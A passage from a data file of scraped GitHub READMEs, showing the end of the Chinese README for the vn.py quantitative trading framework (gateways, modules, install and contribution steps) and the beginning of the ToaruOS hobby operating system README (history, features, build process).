Fund\u7b49\u3002\n\n\u5168\u65b0\u7684\u300avn.py\u5168\u5b9e\u6218\u8fdb\u9636\u300b\u5728\u7ebf\u8bfe\u7a0b\uff0c\u5df2\u7ecf\u5728\u5b98\u65b9\u5fae\u4fe1\u516c\u4f17\u53f7[**vnpy-community**]\u4e0a\u7ebf\uff0c50\u8282\u5185\u5bb9\u8986\u76d6\u4ece\u7b56\u7565\u8bbe\u8ba1\u5f00\u53d1\u3001\u53c2\u6570\u56de\u6d4b\u4f18\u5316\uff0c\u5230\u6700\u7ec8\u5b9e\u76d8\u81ea\u52a8\u4ea4\u6613\u7684\u5b8c\u6574CTA\u91cf\u5316\u4e1a\u52a1\u6d41\u7a0b\u3002\u8d2d\u4e70\u8bf7\u626b\u63cf\u4e0b\u65b9\u4e8c\u7ef4\u7801\u5173\u6ce8\u540e\uff0c\u70b9\u51fb\u83dc\u5355\u680f\u7684\u3010\u8fdb\u9636\u8bfe\u7a0b\u3011\u6309\u94ae\u5373\u53ef\uff1a\n\n<p align=\"center\">\n  <img src =\"https:\/\/vnpy.oss-cn-shanghai.aliyuncs.com\/vnpy_qr.jpg\"\/>\n<\/p>\n\n\u5728\u4f7f\u7528vn.py\u8fdb\u884c\u4e8c\u6b21\u5f00\u53d1\uff08\u7b56\u7565\u3001\u6a21\u5757\u7b49\uff09\u7684\u8fc7\u7a0b\u4e2d\u6709\u4efb\u4f55\u7591\u95ee\uff0c\u8bf7\u67e5\u770b[**vn.py\u9879\u76ee\u6587\u6863**](https:\/\/www.vnpy.com\/docs\/cn\/index.html)\uff0c\u5982\u679c\u65e0\u6cd5\u89e3\u51b3\u8bf7\u524d\u5f80[**\u5b98\u65b9\u793e\u533a\u8bba\u575b**](https:\/\/www.vnpy.com\/forum\/)\u7684\u3010\u63d0\u95ee\u6c42\u52a9\u3011\u677f\u5757\u5bfb\u6c42\u5e2e\u52a9\uff0c\u4e5f\u6b22\u8fce\u5728\u3010\u7ecf\u9a8c\u5206\u4eab\u3011\u677f\u5757\u5206\u4eab\u4f60\u7684\u4f7f\u7528\u5fc3\u5f97\uff01\n\n2.0\u7248\u672c\u57fa\u4e8ePython 3.7\u5168\u65b0\u91cd\u6784\u5f00\u53d1\uff0c\u5982\u9700Python 2\u4e0a\u7684\u7248\u672c\u8bf7\u70b9\u51fb\uff1a[\u957f\u671f\u652f\u6301\u7248\u672cv1.9.2 LTS](https:\/\/github.com\/vnpy\/vnpy\/tree\/v1.9.2-LTS)\u3002\n\n## \u529f\u80fd\u7279\u70b9\n\n1. \u5168\u529f\u80fd\u91cf\u5316\u4ea4\u6613\u5e73\u53f0\uff08vnpy.trader\uff09\uff0c\u6574\u5408\u4e86\u591a\u79cd\u4ea4\u6613\u63a5\u53e3\uff0c\u5e76\u9488\u5bf9\u5177\u4f53\u7b56\u7565\u7b97\u6cd5\u548c\u529f\u80fd\u5f00\u53d1\u63d0\u4f9b\u4e86\u7b80\u6d01\u6613\u7528\u7684API\uff0c\u7528\u4e8e\u5feb\u901f\u6784\u5efa\u4ea4\u6613\u5458\u6240\u9700\u7684\u91cf\u5316\u4ea4\u6613\u5e94\u7528\u3002\n\n2. \u8986\u76d6\u56fd\u5185\u5916\u6240\u6709\u4ea4\u6613\u54c1\u79cd\u7684\u4ea4\u6613\u63a5\u53e3\uff08vnpy.gateway\uff09\uff1a\n\n    * \u56fd\u5185\u5e02\u573a\n\n        * CTP\uff08ctp\uff09\uff1a\u56fd\u5185\u671f\u8d27\u3001\u671f\u6743\n\n        * CTP Mini\uff08mini\uff09\uff1a\u56fd\u5185\u671f\u8d27\u3001\u671f\u6743\n\n        * CTP\u8bc1\u5238\uff08sopt\uff09\uff1aETF\u671f\u6743\n\n        * \u98de\u9a6c\uff08femas\uff09\uff1a\u56fd\u5185\u671f\u8d27\n\n        * \u5bbd\u777f\uff08oes\uff09\uff1a\u56fd\u5185\u8bc1\u5238\uff08A\u80a1\uff09\n\n        * \u4e2d\u6cf0XTP\uff08xtp\uff09\uff1a\u56fd\u5185\u8bc1\u5238\uff08A\u80a1\uff09\n\n        * \u534e\u946b\u5947\u70b9\uff08tora\uff09\uff1a\u56fd\u5185\u8bc1\u5238\uff08A\u80a1\uff09\n\n        * \u946b\u7ba1\u5bb6\uff08xgj\uff09\uff1a\u671f\u8d27\u8d44\u7ba1\n\n        * \u878d\u822a\uff08rohon\uff09\uff1a\u671f\u8d27\u8d44\u7ba1\n\n    * \u6d77\u5916\u5e02\u573a\n\n        * \u5bcc\u9014\u8bc1\u5238\uff08futu\uff09\uff1a\u6e2f\u80a1\u3001\u7f8e\u80a1\n\n        * \u8001\u864e\u8bc1\u5238\uff08tiger\uff09\uff1a\u5168\u7403\u8bc1\u5238\u3001\u671f\u8d27\u3001\u671f\u6743\u3001\u5916\u6c47\u7b49\n\n        * Interactive Brokers\uff08ib\uff09\uff1a\u5168\u7403\u8bc1\u5238\u3001\u671f\u8d27\u3001\u671f\u6743\u3001\u5916\u6c47\u7b49\n\n        * \u6613\u76db9.0\u5916\u76d8\uff08tap\uff09\uff1a\u5168\u7403\u671f\u8d27\n\n        * \u76f4\u8fbe\u671f\u8d27\uff08da\uff09\uff1a\u5168\u7403\u671f\u8d27\n\n        * OANDA\uff08oanda\uff09\uff1a\u5916\u6c47\u3001CFD\n\n    * \u6570\u5b57\u8d27\u5e01\n\n        * BitMEX\uff08bitmex\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u671f\u8d27\u3001\u671f\u6743\u3001\u6c38\u7eed\u5408\u7ea6\n\n        * Bybit\uff08bybit\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u6c38\u7eed\u5408\u7ea6\n\n        * OKEX\u6c38\u7eed\uff08okexs\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u6c38\u7eed\u5408\u7ea6\n\n        * OKEX\u5408\u7ea6\uff08okexf\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u671f\u8d27\n\n        * \u706b\u5e01\u5408\u7ea6\uff08hbdm\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u671f\u8d27\n\n        * Gate.io\u6c38\u7eed\uff08gateios\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u6c38\u7eed\u5408\u7ea6\n\n        * \u5e01\u5b89\uff08binance\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u73b0\u8d27\n\n        * OKEX\uff08okex\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u73b0\u8d27\n\n        * \u706b\u5e01\uff08huobi\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u73b0\u8d27\n\n        * Bitfinex\uff08bitfinex\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u73b0\u8d27\n\n        * Coinbase\uff08coinbase\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u73b0\u8d27\n\n        * Bitstamp\uff08bitstamp\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u73b0\u8d27\n\n        * 1Token\uff08onetoken\uff09\uff1a\u6570\u5b57\u8d27\u5e01\u5238\u5546\uff08\u73b0\u8d27\u3001\u671f\u8d27\uff09\n\n    * \u7279\u6b8a\u5e94\u7528\n\n        * RPC\u670d\u52a1\uff08rpc\uff09\uff1a\u8de8\u8fdb\u7a0b\u901a\u8baf\u63a5\u53e3\uff0c\u7528\u4e8e\u5206\u5e03\u5f0f\u67b6\u6784\n\n3. \u5f00\u7bb1\u5373\u7528\u7684\u5404\u7c7b\u91cf\u5316\u7b56\u7565\u4ea4\u6613\u5e94\u7528\uff08vnpy.app\uff09\uff1a\n\n    * cta_strategy\uff1aCTA\u7b56\u7565\u5f15\u64ce\u6a21\u5757\uff0c\u5728\u4fdd\u6301\u6613\u7528\u6027\u7684\u540c\u65f6\uff0c\u5141\u8bb8\u7528\u6237\u9488\u5bf9CTA\u7c7b\u7b56\u7565\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u59d4\u6258\u7684\u62a5\u64a4\u884c\u4e3a\u8fdb\u884c\u7ec6\u7c92\u5ea6\u63a7\u5236\uff08\u964d\u4f4e\u4ea4\u6613\u6ed1\u70b9\u3001\u5b9e\u73b0\u9ad8\u9891\u7b56\u7565\uff09\n\n    * cta_backtester\uff1aCTA\u7b56\u7565\u56de\u6d4b\u6a21\u5757\uff0c\u65e0\u9700\u4f7f\u7528Jupyter Notebook\uff0c\u76f4\u63a5\u4f7f\u7528\u56fe\u5f62\u754c\u9762\u76f4\u63a5\u8fdb\u884c\u7b56\u7565\u56de\u6d4b\u5206\u6790\u3001\u53c2\u6570\u4f18\u5316\u7b49\u76f8\u5173\u5de5\u4f5c\n\n    * spread_trading\uff1a\u4ef7\u5dee\u4ea4\u6613\u6a21\u5757\uff0c\u652f\u6301\u81ea\u5b9a\u4e49\u4ef7\u5dee\uff0c\u5b9e\u65f6\u8ba1\u7b97\u4ef7\u5dee\u884c\u60c5\u548c\u6301\u4ed3\uff0c\u652f\u6301\u534a\u81ea\u52a8\u4ef7\u5dee\u7b97\u6cd5\u4ea4\u6613\u4ee5\u53ca\u5168\u81ea\u52a8\u4ef7\u5dee\u7b56\u7565\u4ea4\u6613\u4e24\u79cd\u6a21\u5f0f\n\n    * algo_trading\uff1a\u7b97\u6cd5\u4ea4\u6613\u6a21\u5757\uff0c\u63d0\u4f9b\u591a\u79cd\u5e38\u7528\u7684\u667a\u80fd\u4ea4\u6613\u7b97\u6cd5\uff1aTWAP\u3001Sniper\u3001Iceberg\u3001BestLimit\u7b49\u7b49\uff0c\u652f\u6301\u5e38\u7528\u7b97\u6cd5\u914d\u7f6e\u4fdd\u5b58\n\n    * script_trader\uff1a\u811a\u672c\u7b56\u7565\u6a21\u5757\uff0c\u9488\u5bf9\u591a\u6807\u7684\u7ec4\u5408\u7c7b\u4ea4\u6613\u7b56\u7565\u8bbe\u8ba1\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u4e2d\u5b9e\u73b0REPL\u6307\u4ee4\u5f62\u5f0f\u7684\u4ea4\u6613\uff0c\u4e0d\u652f\u6301\u56de\u6d4b\u529f\u80fd\n\n    * portfolio_manager\uff1a\u6295\u8d44\u7ec4\u5408\u6a21\u5757\uff0c\u9762\u5411\u5404\u7c7b\u57fa\u672c\u9762\u4ea4\u6613\u7b56\u7565\uff0c\u4ee5\u72ec\u7acb\u7684\u7b56\u7565\u5b50\u8d26\u6237\u4e3a\u57fa\u7840\uff0c\u63d0\u4f9b\u4ea4\u6613\u4ed3\u4f4d\u7684\u81ea\u52a8\u8ddf\u8e2a\u4ee5\u53ca\u76c8\u4e8f\u5b9e\u65f6\u7edf\u8ba1\u529f\u80fd\n\n    * rpc_service\uff1aRPC\u670d\u52a1\u6a21\u5757\uff0c\u5141\u8bb8\u5c06\u67d0\u4e00VN Trader\u8fdb\u7a0b\u542f\u52a8\u4e3a\u670d\u52a1\u7aef\uff0c\u4f5c\u4e3a\u7edf\u4e00\u7684\u884c\u60c5\u548c\u4ea4\u6613\u8def\u7531\u901a\u9053\uff0c\u5141\u8bb8\u591a\u5ba2\u6237\u7aef\u540c\u65f6\u8fde\u63a5\uff0c\u5b9e\u73b0\u591a\u8fdb\u7a0b\u5206\u5e03\u5f0f\u7cfb\u7edf\n\n    * csv_loader\uff1aCSV\u5386\u53f2\u6570\u636e\u52a0\u8f7d\u5668\uff0c\u7528\u4e8e\u52a0\u8f7dCSV\u683c\u5f0f\u6587\u4ef6\u4e2d\u7684\u5386\u53f2\u6570\u636e\u5230\u5e73\u53f0\u6570\u636e\u5e93\u4e2d\uff0c\u7528\u4e8e\u7b56\u7565\u7684\u56de\u6d4b\u7814\u7a76\u4ee5\u53ca\u5b9e\u76d8\u521d\u59cb\u5316\u7b49\u529f\u80fd\uff0c\u652f\u6301\u81ea\u5b9a\u4e49\u6570\u636e\u8868\u5934\u683c\u5f0f\n\n    * data_recorder\uff1a\u884c\u60c5\u8bb0\u5f55\u6a21\u5757\uff0c\u57fa\u4e8e\u56fe\u5f62\u754c\u9762\u8fdb\u884c\u914d\u7f6e\uff0c\u6839\u636e\u9700\u6c42\u5b9e\u65f6\u5f55\u5236Tick\u6216\u8005K\u7ebf\u884c\u60c5\u5230\u6570\u636e\u5e93\u4e2d\uff0c\u7528\u4e8e\u7b56\u7565\u56de\u6d4b\u6216\u8005\u5b9e\u76d8\u521d\u59cb\u5316\n\n    * risk_manager\uff1a\u98ce\u9669\u7ba1\u7406\u6a21\u5757\uff0c\u63d0\u4f9b\u5305\u62ec\u4ea4\u6613\u6d41\u63a7\u3001\u4e0b\u5355\u6570\u91cf\u3001\u6d3b\u52a8\u59d4\u6258\u3001\u64a4\u5355\u603b\u6570\u7b49\u89c4\u5219\u7684\u7edf\u8ba1\u548c\u9650\u5236\uff0c\u6709\u6548\u5b9e\u73b0\u524d\u7aef\u98ce\u63a7\u529f\u80fd\n\n4. Python\u4ea4\u6613API\u63a5\u53e3\u5c01\u88c5\uff08vnpy.api\uff09\uff0c\u63d0\u4f9b\u4e0a\u8ff0\u4ea4\u6613\u63a5\u53e3\u7684\u5e95\u5c42\u5bf9\u63a5\u5b9e\u73b0\u3002\n\n5. \u7b80\u6d01\u6613\u7528\u7684\u4e8b\u4ef6\u9a71\u52a8\u5f15\u64ce\uff08vnpy.event\uff09\uff0c\u4f5c\u4e3a\u4e8b\u4ef6\u9a71\u52a8\u578b\u4ea4\u6613\u7a0b\u5e8f\u7684\u6838\u5fc3\u3002\n\n6. \u8de8\u8fdb\u7a0b\u901a\u8baf\u6807\u51c6\u7ec4\u4ef6\uff08vnpy.rpc\uff09\uff0c\u7528\u4e8e\u5b9e\u73b0\u5206\u5e03\u5f0f\u90e8\u7f72\u7684\u590d\u6742\u4ea4\u6613\u7cfb\u7edf\u3002\n\n7. Python\u9ad8\u6027\u80fdK\u7ebf\u56fe\u8868\uff08vnpy.chart\uff09\uff0c\u652f\u6301\u5927\u6570\u636e\u91cf\u56fe\u8868\u663e\u793a\u4ee5\u53ca\u5b9e\u65f6\u6570\u636e\u66f4\u65b0\u529f\u80fd\u3002\n\n8. [\u793e\u533a\u8bba\u575b](http:\/\/www.vnpy.com)\u548c[\u77e5\u4e4e\u4e13\u680f](http:\/\/zhuanlan.zhihu.com\/vn-py)\uff0c\u5185\u5bb9\u5305\u62ecvn.py\u9879\u76ee\u7684\u5f00\u53d1\u6559\u7a0b\u548cPython\u5728\u91cf\u5316\u4ea4\u6613\u9886\u57df\u7684\u5e94\u7528\u7814\u7a76\u7b49\u5185\u5bb9\u3002\n\n9. \u5b98\u65b9\u4ea4\u6d41\u7fa4262656087\uff08QQ\uff09\uff0c\u7ba1\u7406\u4e25\u683c\uff08\u5b9a\u671f\u6e05\u9664\u957f\u671f\u6f5c\u6c34\u7684\u6210\u5458\uff09\uff0c\u5165\u7fa4\u8d39\u5c06\u6350\u8d60\u7ed9vn.py\u793e\u533a\u57fa\u91d1\u3002\n\n## \u73af\u5883\u51c6\u5907\n\n* \u63a8\u8350\u4f7f\u7528vn.py\u56e2\u961f\u4e3a\u91cf\u5316\u4ea4\u6613\u4e13\u95e8\u6253\u9020\u7684Python\u53d1\u884c\u7248[VNStudio-2.0.8](https:\/\/download.vnpy.com\/vnstudio-2.0.8.exe)\uff0c\u5185\u7f6e\u4e86\u6700\u65b0\u7248\u7684vn.py\u6846\u67b6\u4ee5\u53caVN Station\u91cf\u5316\u7ba1\u7406\u5e73\u53f0\uff0c\u65e0\u9700\u624b\u52a8\u5b89\u88c5\n* \u652f\u6301\u7684\u7cfb\u7edf\u7248\u672c\uff1aWindows 7\u4ee5\u4e0a\/Windows Server 2008\u4ee5\u4e0a\/Ubuntu 18.04 LTS\n* \u652f\u6301\u7684Python\u7248\u672c\uff1aPython 3.7 64\u4f4d\uff08**\u6ce8\u610f\u5fc5\u987b\u662fPython 3.7 64\u4f4d\u7248\u672c**\uff09\n\n## \u5b89\u88c5\u6b65\u9aa4\n\n\u5728[\u8fd9\u91cc](https:\/\/github.com\/vnpy\/vnpy\/releases)\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\uff0c\u89e3\u538b\u540e\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5\uff1a\n\n**Windows**\n\n    install.bat\n\n**Ubuntu**\n\n    bash install.sh\n\n## \u4f7f\u7528\u6307\u5357\n\n1. \u5728[SimNow](http:\/\/www.simnow.com.cn\/)\u6ce8\u518cCTP\u4eff\u771f\u8d26\u53f7\uff0c\u5e76\u5728[\u8be5\u9875\u9762](http:\/\/www.simnow.com.cn\/product.action)\u83b7\u53d6\u7ecf\u7eaa\u5546\u4ee3\u7801\u4ee5\u53ca\u4ea4\u6613\u884c\u60c5\u670d\u52a1\u5668\u5730\u5740\u3002\n\n2. \u5728[vn.py\u793e\u533a\u8bba\u575b](https:\/\/www.vnpy.com\/forum\/)\u6ce8\u518c\u83b7\u5f97VN Station\u8d26\u53f7\u5bc6\u7801\uff08\u8bba\u575b\u8d26\u53f7\u5bc6\u7801\u5373\u662f\uff09\n\n3. \u542f\u52a8VN Station\uff08\u5b89\u88c5VNConda\u540e\u4f1a\u5728\u684c\u9762\u81ea\u52a8\u521b\u5efa\u5feb\u6377\u65b9\u5f0f\uff09\uff0c\u8f93\u5165\u4e0a\u4e00\u6b65\u7684\u8d26\u53f7\u5bc6\u7801\u767b\u5f55\n\n4. \u70b9\u51fb\u5e95\u90e8\u7684**VN Trader Lite**\u6309\u94ae\uff0c\u5f00\u59cb\u4f60\u7684\u4ea4\u6613\uff01\uff01\uff01\n\n\u6ce8\u610f\uff1a\n\n* \u5728VN Trader\u7684\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u8bf7\u52ff\u5173\u95edVN Station\uff08\u4f1a\u81ea\u52a8\u9000\u51fa\uff09\n* \u5982\u9700\u8981\u7075\u6d3b\u914d\u7f6e\u91cf\u5316\u4ea4\u6613\u5e94\u7528\u7ec4\u4ef6\uff0c\u8bf7\u4f7f\u7528**VN Trader Pro**\n\n## \u811a\u672c\u8fd0\u884c\n\n\u9664\u4e86\u57fa\u4e8eVN Station\u7684\u56fe\u5f62\u5316\u542f\u52a8\u65b9\u5f0f\u5916\uff0c\u4e5f\u53ef\u4ee5\u5728\u4efb\u610f\u76ee\u5f55\u4e0b\u521b\u5efarun.py\uff0c\u5199\u5165\u4ee5\u4e0b\u793a\u4f8b\u4ee3\u7801\uff1a\n\n```Python\nfrom vnpy.event import EventEngine\nfrom vnpy.trader.engine import MainEngine\nfrom vnpy.trader.ui import MainWindow, create_qapp\nfrom vnpy.gateway.ctp import CtpGateway\nfrom vnpy.app.cta_strategy import CtaStrategyApp\nfrom vnpy.app.cta_backtester import CtaBacktesterApp\n\ndef main():\n    \"\"\"Start VN Trader\"\"\"\n    qapp = create_qapp()\n\n    event_engine = EventEngine()\n    main_engine = MainEngine(event_engine)\n    \n    main_engine.add_gateway(CtpGateway)\n    main_engine.add_app(CtaStrategyApp)\n    main_engine.add_app(CtaBacktesterApp)\n\n    main_window = MainWindow(main_engine, event_engine)\n    main_window.showMaximized()\n\n    qapp.exec()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n\u5728\u8be5\u76ee\u5f55\u4e0b\u6253\u5f00CMD\uff08\u6309\u4f4fShift->\u70b9\u51fb\u9f20\u6807\u53f3\u952e->\u5728\u6b64\u5904\u6253\u5f00\u547d\u4ee4\u7a97\u53e3\/PowerShell\uff09\u540e\u8fd0\u884c\u4e0b\u5217\u547d\u4ee4\u542f\u52a8VN Trader\uff1a\n\n    python run.py\n\n## \u8d21\u732e\u4ee3\u7801\n\nvn.py\u4f7f\u7528Github\u6258\u7ba1\u5176\u6e90\u4ee3\u7801\uff0c\u5982\u679c\u5e0c\u671b\u8d21\u732e\u4ee3\u7801\u8bf7\u4f7f\u7528github\u7684PR\uff08Pull Request\uff09\u7684\u6d41\u7a0b:\n\n1. [\u521b\u5efa Issue](https:\/\/github.com\/vnpy\/vnpy\/issues\/new) - \u5bf9\u4e8e\u8f83\u5927\u7684\u6539\u52a8\uff08\u5982\u65b0\u529f\u80fd\uff0c\u5927\u578b\u91cd\u6784\u7b49\uff09\u6700\u597d\u5148\u5f00issue\u8ba8\u8bba\u4e00\u4e0b\uff0c\u8f83\u5c0f\u7684improvement\uff08\u5982\u6587\u6863\u6539\u8fdb\uff0cbugfix\u7b49\uff09\u76f4\u63a5\u53d1PR\u5373\u53ef\n\n2. Fork [vn.py](https:\/\/github.com\/vnpy\/vnpy) - \u70b9\u51fb\u53f3\u4e0a\u89d2**Fork**\u6309\u94ae\n\n3. Clone\u4f60\u81ea\u5df1\u7684fork: ```git clone https:\/\/github.com\/$userid\/vnpy.git```\n\t* \u5982\u679c\u4f60\u7684fork\u5df2\u7ecf\u8fc7\u65f6\uff0c\u9700\u8981\u624b\u52a8sync\uff1a[\u540c\u6b65\u65b9\u6cd5](https:\/\/help.github.com\/articles\/syncing-a-fork\/)\n\n4. \u4ece**dev**\u521b\u5efa\u4f60\u81ea\u5df1\u7684feature branch: ```git checkout -b $my_feature_branch dev```\n\n5. \u5728$my_feature_branch\u4e0a\u4fee\u6539\u5e76\u5c06\u4fee\u6539push\u5230\u4f60\u7684fork\u4e0a\n\n6. \u521b\u5efa\u4ece\u4f60\u7684fork\u7684$my_feature_branch\u5206\u652f\u5230\u4e3b\u9879\u76ee\u7684**dev**\u5206\u652f\u7684[Pull Request] -  [\u5728\u6b64](https:\/\/github.com\/vnpy\/vnpy\/compare?expand=1)\u70b9\u51fb**compare across forks**\uff0c\u9009\u62e9\u9700\u8981\u7684fork\u548cbranch\u521b\u5efaPR\n\n7. \u7b49\u5f85review, \u9700\u8981\u7ee7\u7eed\u6539\u8fdb\uff0c\u6216\u8005\u88abMerge!\n\n\u5728\u63d0\u4ea4\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u8bf7\u9075\u5b88\u4ee5\u4e0b\u89c4\u5219\uff0c\u4ee5\u63d0\u9ad8\u4ee3\u7801\u8d28\u91cf\uff1a\n\n  * \u4f7f\u7528[autopep8](https:\/\/github.com\/hhatto\/autopep8)\u683c\u5f0f\u5316\u4f60\u7684\u4ee3\u7801\u3002\u8fd0\u884c```autopep8 --in-place --recursive . ```\u5373\u53ef\u3002\n  * \u4f7f\u7528[flake8](https:\/\/pypi.org\/project\/flake8\/)\u68c0\u67e5\u4f60\u7684\u4ee3\u7801\uff0c\u786e\u4fdd\u6ca1\u6709error\u548cwarning\u3002\u5728\u9879\u76ee\u6839\u76ee\u5f55\u4e0b\u8fd0\u884c```flake8```\u5373\u53ef\u3002\n\n\n\n## \u9879\u76ee\u6350\u8d60\n\n\u8fc7\u53bb5\u5e74\u4e2d\u6536\u5230\u8fc7\u8bb8\u591a\u793e\u533a\u7528\u6237\u7684\u6350\u8d60\uff0c\u5728\u6b64\u6df1\u8868\u611f\u8c22\uff01\u6240\u6709\u7684\u6350\u8d60\u8d44\u91d1\u90fd\u6295\u5165\u5230\u4e86vn.py\u793e\u533a\u57fa\u91d1\u4e2d\uff0c\u7528\u4e8e\u652f\u6301vn.py\u9879\u76ee\u7684\u8fd0\u4f5c\u3002\n\n\u5148\u5f3a\u8c03\u4e00\u4e0b\uff1a**vn.py\u662f\u5f00\u6e90\u9879\u76ee\uff0c\u53ef\u4ee5\u6c38\u4e45\u514d\u8d39\u4f7f\u7528\uff0c\u5e76\u6ca1\u6709\u5f3a\u5236\u6350\u8d60\u7684\u8981\u6c42\uff01\uff01\uff01**\n\n\u6350\u8d60\u65b9\u5f0f\uff1a\u652f\u4ed8\u5b9d3216630132@qq.com\uff08*\u6653\u4f18\uff09\n\n\u957f\u671f\u7ef4\u62a4\u6350\u8d60\u6e05\u5355\uff0c\u8bf7\u5728\u7559\u8a00\u4e2d\u6ce8\u660e\u662f\u9879\u76ee\u6350\u8d60\u4ee5\u53ca\u6350\u8d60\u4eba\u7684\u540d\u5b57\u3002\n\n## \u5176\u4ed6\u5185\u5bb9\n\n* [\u83b7\u53d6\u5e2e\u52a9](https:\/\/github.com\/vnpy\/vnpy\/blob\/dev\/docs\/SUPPORT.md)\n* [\u793e\u533a\u884c\u4e3a\u51c6\u4fa7](https:\/\/github.com\/vnpy\/vnpy\/blob\/dev\/docs\/CODE_OF_CONDUCT.md)\n* [Issue\u6a21\u677f](https:\/\/github.com\/vnpy\/vnpy\/blob\/dev\/docs\/ISSUE_TEMPLATE.md)\n* [PR\u6a21\u677f](https:\/\/github.com\/vnpy\/vnpy\/blob\/dev\/docs\/PULL_REQUEST_TEMPLATE.md)\n\n## \u7248\u6743\u8bf4\u660e\n\nMIT\n"},{"repo":"\/klange\/toaruos","language":"C","readme_contents":"# ToaruOS\n\nToaruOS is a hobbyist, educational, Unix-like operating system built entirely from scratch and capable of hosting Python 3 and GCC. It includes a kernel, bootloader, dynamic linker, C standard library, composited windowing system, package manager, and several utilities and applications. All components of the core operating system are original, providing a complete environment in approximately 80,000 lines of C and assembly, all of which is included in this repository.\n\n![Screenshot](https:\/\/user-images.githubusercontent.com\/223546\/64397089-ee1e1280-d09a-11e9-8f86-6952654fe69a.png)\n*Demonstration of ToaruOS's UI, terminal emulator, editor, package manager, and file browser.*\n\n## History\n\nThe ToaruOS project began in December 2010 and has its roots in an independent student project. The goals of the project have changed throughout its history, initially as a learning experience for the authors, and more recently as a complete, from-scratch ecosystem.\n\nToaruOS 1.0 was released in January, 2017, and featured a Python userspace built on Newlib. Since 1.6.x, ToaruOS has had its own C library, dependencies on third-party libraries have been removed, and most of the Python userspace has been rewritten in C. More recent releases have focused on improving the C library support, providing more ports in our package repository, and adding new features.\n\nPlans for 2019 include a 64-bit kernel port, more filesystem drivers, and an installer. We're also working on our own C compiler toolchain.\n\n## Features\n\n- **Dynamically linked userspace** with support for runtime `dlopen`ing of additional libraries.\n- **Composited graphical UI** with SSE-accelerated alpha blitting and optional Cairo backend.\n- **Extensible, modular kernel** with loadable drivers.\n- **VM integration** for absolute mouse and automatic display sizing in VirtualBox and VMware Workstation.\n- **Unix-like terminal interface** including a feature-rich terminal emulator and several familiar utilities.\n- **TCP\/IPv4 support** with utilities to download from HTTP servers and connect to IRC.\n- **Optional third-party ports** including Python 3.6, GCC 6.4.0, Binutils, Cairo, and Freetype.\n\n### Notable Components\n\n- **Toaru Kernel**, [kernel\/](kernel\/), the core of the operating system. \n- **Yutani**  (window compositor), [apps\/compositor.c](apps\/compositor.c), manages window buffers, layout, and input routing.\n- **Bim** (text editor), [apps\/bim.c](apps\/bim.c), is a vim-inspired editor with syntax highlighting.\n- **Terminal**, [apps\/terminal.c](apps\/terminal.c), xterm-esque terminal emulator with 256 and 24-bit color support.\n- **ld.so** (dynamic linker\/loader), [linker\/linker.c](linker\/linker.c), loads dynamically-linked ELF binaries.\n- **Esh** (shell), [apps\/sh.c](apps\/sh.c), supports pipes, redirections, variables, and more.\n- **MSK** (package manager), [apps\/msk.c](apps\/msk.c), with support for online package installation.\n\n## Current Goals\n\nThe following projects are currently in progress:\n\n- **Improve POSIX coverage** especially in regards to signals, synchronization primitives, as well as by providing more common utilities.\n- **Continue to improve the C library** which remains quite incomplete compared to Newlib and is a major source of issues with bringing back old ports.\n- **Implement a native dynamic, interpreted programming language** to replace Python, which was used prior to ToaruOS 1.6.x to provide most of the desktop environment.\n- **Replace third-party development tools** to get the OS to a state where it is self-hosting with just the addition of a C compiler.\n- **Implement a C compiler toolchain** in [toarucc](https:\/\/github.com\/klange\/toarucc).\n\n## Building \/ Installation\n\nTo build ToaruOS from source, it is currently recommended you use a recent Debian- or Ubuntu-derived Linux host environment.\n\nSeveral packages are necessary for the build system: `build-essential` (to build the cross-compiler), `xorriso` (to create CD images), `python3` (various build scripts), `mtools` (for building FAT EFI system partitions), `gnu-efi` (for building the EFI loaders).\n\nBeyond package installation, no part of the build needs root privileges.\n\nThe build process has two parts: building a cross-compiler, and building the operating system. The cross-compiler uses GCC 6.4.0 and will be built automatically by `make` if other dependencies have been met. This only needs to be done once, and the cross-compiler does not depend on any of the components built for the operating system itself, though it is attached to the base directory of the repository so you may need to rebuild the toolchain if you move your checkout. Once the cross-compiler has been built, `make` will continue to build the operating system itself.\n\n### Building With Docker\n\nYou can skip the process of building the cross-compiler toolchain (which doesn't get updated very often anyway) by using our pre-built toolchain through Docker:\n\n    git clone https:\/\/github.com\/klange\/toaruos\n    cd toaruos\n    docker pull toaruos\/build-tools:1.8.x\n    docker run -v `pwd`:\/root\/toaruos -w \/root\/toaruos -e LANG=C.UTF-8 -t toaruos\/build-tools:1.8.x util\/build-travis.sh\n\nAfter building like this, you can run the various utility targets (`make run`, etc.) by setting `TOOLCHAIN=none`. Try `TOOLCHAIN=none make shell` to run a ToaruOS shell (using QEMU and a network socket - you'll need netcat for this to work).\n\n### Build Process Internals\n\nThe `Makefile` first checks to see if a toolchain is available and activates it (appends its `bin` directory to `$PATH`). If a toolchain is not available, users are prompted if they would like to build one. This process downloads and patches both Binutils and GCC and then builds and installs them locally.\n\nThe `Makefile` then uses a Python tool, `auto-dep.py`, to generate additional Makefiles for the userspace applications libraries, automatically resolving dependencies based on `#include` directives.\n\nIn an indeterminate order, C library, kernel, modules, userspace librares and applications are built. Three boot loaders (one BIOS ATAPI CD loader for emulators, and both a 32-bit and 64-bit EFI loader for general use) are then built. Deployed binaries are stored in `base` which is then compiled into a tar archive to use as a ramdisk image. This image, along with the bootloader files and kernel are then placed in `fatbase` which is converted into a FAT image for use as the EFI boot payload. That image is then placed in `cdbase` along with shadow files representing each of the files in the FAT image, and `cdbase` is compiled into an ISO 9660 CD El Torito image. The CD image is then passed through a tool to map the shadow files to their actual data from the FAT image, creating a hybrid ISO 9660 \/ FAT.\n\n### Clang\n\nThe kernel and driver modules 